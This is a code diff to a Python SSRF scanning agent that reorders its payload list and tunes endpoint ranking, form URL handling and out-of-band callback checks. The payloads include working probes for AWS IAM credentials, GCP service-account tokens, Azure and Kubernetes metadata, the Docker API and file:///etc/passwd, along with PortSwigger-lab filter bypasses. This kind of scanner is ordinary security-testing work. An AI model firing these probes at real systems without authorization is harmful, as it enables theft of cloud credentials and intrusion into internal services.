@@ -44,78 +44,69 @@ SSRF_PARAM_NAMES = {
 # SSRF Payloads — Cloud Metadata, Internal, Protocol, PortSwigger Bypasses
 # ─────────────────────────────────────────────────────────
 SSRF_PAYLOADS = [
-    # AWS EC2 IMDSv1 (unauthenticated)
-    {"name": "aws_imds_root", "url": "http://169.254.169.254/latest/meta-data/",
-     "indicators": ["ami-id", "instance-id", "hostname", "local-ipv4", "public-keys"],
-     "description": "AWS EC2 Instance Metadata Service (IMDSv1) - root path"},
-    {"name": "aws_imds_credentials", "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-     "indicators": ["AccessKeyId", "SecretAccessKey", "Token", "Expiration"],
-     "description": "AWS IAM credentials via IMDS - CRITICAL if accessible"},
-    {"name": "aws_imds_userdata", "url": "http://169.254.169.254/latest/user-data",
-     "indicators": ["#!/", "cloud-init", "AWS", "password", "secret"],
-     "description": "AWS user-data script - may contain secrets"},
-    # Internal loopback / Admin probes (PortSwigger & OWASP)
+    # 1. Internal loopback & Admin probes (PortSwigger & OWASP) - High priority
     {"name": "localhost_admin", "url": "http://localhost/admin",
      "indicators": ["admin", "carlos", "delete", "user management", "administrator", "admin panel"],
      "description": "Localhost admin interface probe"},
     {"name": "127_admin", "url": "http://127.0.0.1/admin",
      "indicators": ["admin", "carlos", "delete", "user management", "administrator", "admin panel"],
      "description": "127.0.0.1 loopback admin probe"},
-    {"name": "internal_subnet_admin", "url": "http://192.168.0.12:8080/admin",
-     "indicators": ["admin", "carlos", "delete", "user management", "administrator", "admin panel"],
-     "description": "Internal 192.168.0.x subnet admin probe (PortSwigger)"},
-    # Open Redirect filter bypass (PortSwigger Lab 1)
+
+    # 2. Cloud Metadata Probes (AWS EC2 IMDSv1 & IMDSv2)
+    {"name": "aws_imds_root", "url": "http://169.254.169.254/latest/meta-data/",
+     "indicators": ["ami-id", "instance-id", "hostname", "local-ipv4", "public-keys"],
+     "description": "AWS EC2 Instance Metadata Service (IMDSv1) - root path"},
+    {"name": "aws_imds_credentials", "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+     "indicators": ["AccessKeyId", "SecretAccessKey", "Token", "Expiration"],
+     "description": "AWS IAM credentials via IMDS - CRITICAL if accessible"},
+
+    # 3. PortSwigger & Whitelist Bypass Probes
     {"name": "open_redirect_bypass", "url": "/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin",
      "indicators": ["admin", "carlos", "delete", "user management", "administrator"],
      "description": "SSRF filter bypass via open redirection chaining"},
-    {"name": "open_redirect_local_admin", "url": "/product/nextProduct?path=http://localhost/admin",
-     "indicators": ["admin", "carlos", "delete", "user management"],
-     "description": "SSRF open redirection to localhost admin"},
-    # Whitelist & URL parser bypass (PortSwigger Lab 2)
     {"name": "whitelist_fragment_bypass", "url": "http://localhost#@stock.weliketoshop.net/admin",
      "indicators": ["admin", "carlos", "delete", "user management"],
      "description": "SSRF whitelist bypass using URL fragment and credentials syntax"},
+    {"name": "internal_subnet_admin", "url": "http://192.168.0.12:8080/admin",
+     "indicators": ["admin", "carlos", "delete", "user management", "administrator", "admin panel"],
+     "description": "Internal 192.168.0.x subnet admin probe (PortSwigger)"},
     {"name": "whitelist_encoded_fragment", "url": "http://localhost%23@stock.weliketoshop.net/admin",
      "indicators": ["admin", "carlos", "delete", "user management"],
      "description": "SSRF whitelist bypass using double-encoded fragment"},
+    {"name": "open_redirect_local_admin", "url": "/product/nextProduct?path=http://localhost/admin",
+     "indicators": ["admin", "carlos", "delete", "user management"],
+     "description": "SSRF open redirection to localhost admin"},
     {"name": "whitelist_127_bypass", "url": "http://127.0.0.1#@stock.weliketoshop.net/admin",
      "indicators": ["admin", "carlos", "delete", "user management"],
      "description": "SSRF whitelist bypass with 127.0.0.1 loopback"},
-    # GCP Metadata
+
+    # 4. GCP & Azure Metadata
+    {"name": "aws_imds_userdata", "url": "http://169.254.169.254/latest/user-data",
+     "indicators": ["#!/", "cloud-init", "AWS", "password", "secret"],
+     "description": "AWS user-data script - may contain secrets"},
     {"name": "gcp_metadata_root", "url": "http://metadata.google.internal/computeMetadata/v1/",
      "indicators": ["project", "instance", "serviceAccounts"],
      "description": "GCP Compute Engine Metadata Service"},
     {"name": "gcp_metadata_token", "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
      "indicators": ["access_token", "token_type", "expires_in"],
      "description": "GCP service account OAuth token"},
-    # Azure IMDS
     {"name": "azure_imds", "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
      "indicators": ["subscriptionId", "resourceGroupName", "vmId"],
      "description": "Azure Instance Metadata Service"},
-    # Docker / Kubernetes internal
+
+    # 3. Docker / Local Protocols
     {"name": "docker_api", "url": "http://localhost:2375/info",
      "indicators": ["DockerRootDir", "Containers", "ServerVersion"],
      "description": "Docker daemon API (unauthenticated) on localhost:2375"},
     {"name": "k8s_api", "url": "https://kubernetes.default.svc/api/v1/namespaces",
      "indicators": ["namespaces", "apiVersion", "items"],
      "description": "Kubernetes API Server internal endpoint"},
-    # Internal loopback probes
     {"name": "localhost_80", "url": "http://localhost/",
      "indicators": ["html", "server", "nginx", "apache"],
      "description": "Internal loopback HTTP probe (localhost:80)"},
-    {"name": "localhost_8080", "url": "http://127.0.0.1:8080/",
-     "indicators": ["html", "server", "api", "health"],
-     "description": "Internal loopback probe (127.0.0.1:8080)"},
-    {"name": "ipv6_loopback", "url": "http://[::1]/",
-     "indicators": ["html", "server"],
-     "description": "IPv6 loopback probe"},
-    # Protocol switching (evidence of parser)
     {"name": "file_etc_passwd", "url": "file:///etc/passwd",
      "indicators": ["root:", "nobody:", "daemon:", "bin:"],
      "description": "Local file read via file:// protocol - LFI via SSRF"},
-    {"name": "dict_probe", "url": "dict://localhost:11211/stats",
-     "indicators": ["STAT", "VERSION", "uptime"],
-     "description": "dict:// protocol - Memcached internal probe"},
 ]
 
 # Status codes that suggest the server relayed a request (even without body leak)
@@ -159,18 +150,36 @@ class SSRFCapabilityAgent(BaseCapabilityAgent):
         # 1. Collect all candidate endpoints from observations
         candidate_endpoints = self._extract_ssrf_targets(context)
 
-        findings: List[Dict[str, Any]] = []
-        payloads_to_test = SSRF_PAYLOADS if deep_mode else SSRF_PAYLOADS[:6]
+        # Prioritize forms and endpoints with SSRF parameter names like stockApi
+        def _score_endpoint(ep):
+            score = 0
+            url_lower = ep.get("url", "").lower()
+            params = [str(p).lower() for p in ep.get("params", []) + ep.get("form_parameters", [])]
+            if any(p in ("stockapi", "stock_api", "stock", "url", "api_url", "fetch", "proxy") for p in params):
+                score += 20
+            if ep.get("method") == "POST":
+                score += 10
+            if "stock" in url_lower or "fetch" in url_lower:
+                score += 10
+            return -score
 
-        for endpoint in candidate_endpoints[:10]:  # test up to 10 SSRF-surface endpoints
+        sorted_endpoints = sorted(candidate_endpoints, key=_score_endpoint)
+        payloads_to_test = SSRF_PAYLOADS if deep_mode else SSRF_PAYLOADS[:8]
+
+        findings: List[Dict[str, Any]] = []
+        for endpoint in sorted_endpoints[:6]:  # test up to 6 top-ranked SSRF surfaces
             for ssrf_payload in payloads_to_test:
-                finding = await self._test_ssrf(
-                    http_client, endpoint, ssrf_payload
-                )
-                if finding:
-                    findings.append(finding)
-                    if finding.get("is_vulnerable"):
-                        break  # confirm first, stop on definitive hit
+                try:
+                    finding = await self._test_ssrf(http_client, endpoint, ssrf_payload)
+                    if finding:
+                        findings.append(finding)
+                        if finding.get("is_vulnerable"):
+                            logger.info(f"[SSRFCapabilityAgent] Confirmed SSRF on {endpoint.get('url')} with {ssrf_payload.get('name')}")
+                            break
+                except Exception as e:
+                    logger.debug(f"[SSRFCapabilityAgent] Error testing {endpoint.get('url')}: {e}")
+            if any(f.get("is_vulnerable") for f in findings):
+                break
 
         # Determine overall verdict
         confirmed = [f for f in findings if f.get("is_vulnerable")]
@@ -228,6 +237,13 @@ class SSRFCapabilityAgent(BaseCapabilityAgent):
             for form in data.get("forms", []):
                 if isinstance(form, dict):
                     action = form.get("action", "")
+                    if action and not action.startswith(("http://", "https://")):
+                        clean_a = context.asset.split("/")[0].split("?")[0]
+                        for pfx in ("https://", "http://"):
+                            if clean_a.startswith(pfx):
+                                clean_a = clean_a[len(pfx):]
+                        action = f"https://{clean_a}{action if action.startswith('/') else '/' + action}"
+
                     method = form.get("method", "POST").upper()
                     params = form.get("parameters", [])
                     ssrf_params = [p for p in params if p.lower() in SSRF_PARAM_NAMES]
@@ -341,7 +357,7 @@ class SSRFCapabilityAgent(BaseCapabilityAgent):
         oob_url = oob_server.get_callback_url(oob_token)
 
         oob_hit = False
-        if not is_definitive_ssrf:
+        if not is_definitive_ssrf and ssrf_payload.get("name") == "oob_callback":
             try:
                 if method == "POST":
                     oob_form = dict(form_params) if 'form_params' in locals() else {param_name: oob_url}
@@ -352,7 +368,7 @@ class SSRFCapabilityAgent(BaseCapabilityAgent):
                     oob_query[param_name] = [oob_url]
                     oob_injected = urlunparse(parsed._replace(query=urlencode(oob_query, doseq=True)))
                     await http_client.send_as_identity(identity_id="anonymous_guest", method="GET", url=oob_injected)
-                oob_hit = await oob_server.wait_for_interaction(oob_token, timeout=2.0)
+                oob_hit = await oob_server.wait_for_interaction(oob_token, timeout=0.5)
             except Exception:
                 pass
 
@@ -387,7 +403,7 @@ class SSRFCapabilityAgent(BaseCapabilityAgent):
             reasoning = f"Payload '{ssrf_payload['name']}' blocked or rejected (HTTP {status})."
 
         return {
-            "tested_url": injected_url,
+            "tested_url": base_url if method == "POST" else injected_url,
             "payload_name": ssrf_payload["name"],
             "payload_description": ssrf_payload["description"],
             "ssrf_target_url": ssrf_url,
